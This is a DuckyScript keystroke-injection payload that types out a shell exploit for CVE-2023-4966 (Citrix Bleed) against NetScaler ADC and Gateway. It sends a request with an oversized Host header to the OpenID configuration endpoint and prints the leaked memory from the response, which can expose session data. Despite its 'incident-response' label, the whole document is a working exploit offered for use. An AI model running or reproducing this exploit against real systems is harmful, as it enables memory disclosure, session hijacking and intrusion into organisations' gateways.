REM ####################################################################################
REM #                                                                                  #
REM # Title         : Exploit Citrix NetScaler ADC and Gateway through CVE-2023-4966   #
REM # Author	    : Aleff                                                            #
REM # Version	    : 1.0                                                              #
REM # Category	    : incident-response                                                #
REM # Target	    : Citrix NetScaler ADV; NetScaler Gateway                          #
REM #                                                                                  #
REM ####################################################################################

REM GNU/Linux Version

DELAY 3000
CTRL-ALT t
DELAY 1000

STRING header_value=$(yes a | head -n 24576 | tr -d '\n')
ENTER
DELAY 500
STRING headers="-H 'Host:$header_value'"
ENTER
DELAY 500

REM Define here your target, so put here the Citrix ADC / Gateway target, excluding the protocol (e.g. 192.168.1.200)
STRING response=$(curl -s -k -H "$headers" "https://#HOSTNAME/oauth/idp/.well-known/openid-configuration" --connect-timeout 10)
ENTER
DELAY 500

STRING if [ $? -eq 0 ] && [ "$(echo $response | cut -c 1-3)" == "200" ]; then
ENTER
DELAY 500
STRING echo "--- Dumped memory ---"
ENTER
DELAY 500
STRING echo "$response" | cut -c 131051-
ENTER
DELAY 500
STRING echo "---      End      ---"
ENTER
DELAY 500
STRING else
ENTER
DELAY 500
STRING echo "Could not dump memory"
ENTER
DELAY 500
STRING fi
ENTER
